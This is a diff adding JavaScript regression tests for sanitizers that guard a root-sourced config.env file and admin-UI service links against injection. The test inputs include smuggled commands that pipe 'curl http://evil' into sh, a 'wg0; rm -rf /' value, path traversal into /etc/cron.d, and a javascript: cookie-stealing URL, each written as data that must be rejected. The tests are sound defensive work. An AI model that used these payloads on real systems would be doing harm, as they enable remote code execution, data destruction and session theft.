@@ -13,6 +13,9 @@ const {
 	_collectSiteNetworks,
 	_computeOtherSiteNets,
 	sanitizeUnifiFields,
+	sanitizeAgentMode,
+	sanitizeWgInterface,
+	sanitizeAgentServices,
 	_parseAllowedSites,
 	sanitizeHubUrl,
 	buildLoopScript,
@@ -247,6 +250,75 @@ test("sanitizeUnifiFields rejects config.env injection in pass/user (quote/newli
 test("sanitizeUnifiFields rejects a non-http(s) / metacharacter unifi_url", () => {
 	assert.throws(() => sanitizeUnifiFields({ unifi_url: "file:///etc/passwd" }, {}), /valid http/);
 	assert.throws(() => sanitizeUnifiFields({ unifi_url: "https://h/$(reboot)" }, {}), /valid http/);
+});
+
+// ─── sanitizeAgentMode / sanitizeWgInterface (config.env injection guard) ─────
+
+// Regression: mode and wg_interface are interpolated into the same root-sourced
+// config.env heredoc (AGENT_MODE="..."/WG_INTERFACE="...") that sanitizeUnifiFields
+// guards. A quote+newline closes the assignment and injects arbitrary lines.
+test("sanitizeAgentMode accepts whitelisted modes and defaults falsy to native", () => {
+	assert.equal(sanitizeAgentMode("native"), "native");
+	assert.equal(sanitizeAgentMode("unifi"), "unifi");
+	assert.equal(sanitizeAgentMode(undefined), "native");
+	assert.equal(sanitizeAgentMode(""), "native");
+});
+
+test("sanitizeAgentMode rejects config.env injection payloads", () => {
+	for (const bad of ['native"\ncurl http://evil|sh\n#', "native; reboot", "NATIVE", "unifi "]) {
+		assert.throws(() => sanitizeAgentMode(bad), /mode must be one of/, `should reject ${JSON.stringify(bad)}`);
+	}
+});
+
+test("sanitizeWgInterface accepts wg<number> and defaults falsy to wg0", () => {
+	assert.equal(sanitizeWgInterface("wg0"), "wg0");
+	assert.equal(sanitizeWgInterface("wg123"), "wg123");
+	assert.equal(sanitizeWgInterface(undefined), "wg0");
+	assert.equal(sanitizeWgInterface(""), "wg0");
+});
+
+test("sanitizeWgInterface rejects injection / traversal interface names", () => {
+	for (const bad of ['wg0"\ncurl http://evil|sh\n#', "../../etc/cron.d/x", "wg0; rm -rf /", "eth0", "wg0 ", "wg1234"]) {
+		assert.throws(() => sanitizeWgInterface(bad), /wg_interface must match/, `should reject ${JSON.stringify(bad)}`);
+	}
+});
+
+// ─── sanitizeAgentServices (heartbeat → admin-clickable hrefs) ────────────────
+
+// Regression: heartbeat services come from the agent's POST body and are rendered
+// as <a href={svc.url}>{svc.name}</a> in the admin UI — javascript: URLs and
+// malformed entries must never be persisted.
+test("sanitizeAgentServices keeps well-formed http(s) entries", () => {
+	const result = sanitizeAgentServices([
+		{ name: "Portainer", url: "https://192.168.1.5:9443" },
+		{ name: "Grafana", url: "http://192.168.1.5:3000" },
+	]);
+	assert.deepEqual(result, [
+		{ name: "Portainer", url: "https://192.168.1.5:9443" },
+		{ name: "Grafana", url: "http://192.168.1.5:3000" },
+	]);
+});
+
+test("sanitizeAgentServices drops javascript:/non-http URLs and malformed entries", () => {
+	const result = sanitizeAgentServices([
+		{ name: "XSS", url: "javascript:alert(document.cookie)" },
+		{ name: "File", url: "file:///etc/passwd" },
+		{ name: "NoUrl" },
+		{ name: 42, url: "http://ok.example" },
+		{ name: "NotAUrl", url: "not a url" },
+		"just-a-string",
+		null,
+		{ name: "Legit", url: "http://192.168.1.5:8080" },
+	]);
+	assert.deepEqual(result, [{ name: "Legit", url: "http://192.168.1.5:8080" }]);
+});
+
+test("sanitizeAgentServices caps entry count and field lengths", () => {
+	const many = Array.from({ length: 60 }, (_, i) => ({ name: `svc${i}`, url: `http://10.0.0.1:${1000 + i}` }));
+	assert.equal(sanitizeAgentServices(many).length, 50);
+	const [long] = sanitizeAgentServices([{ name: "x".repeat(500), url: "http://10.0.0.1" }]);
+	assert.equal(long.name.length, 100);
+	assert.deepEqual(sanitizeAgentServices("nope"), []);
 });
 
 // ─── sanitizeAclNetworks canonicalization (host-bits + IPv6) ─────────────────
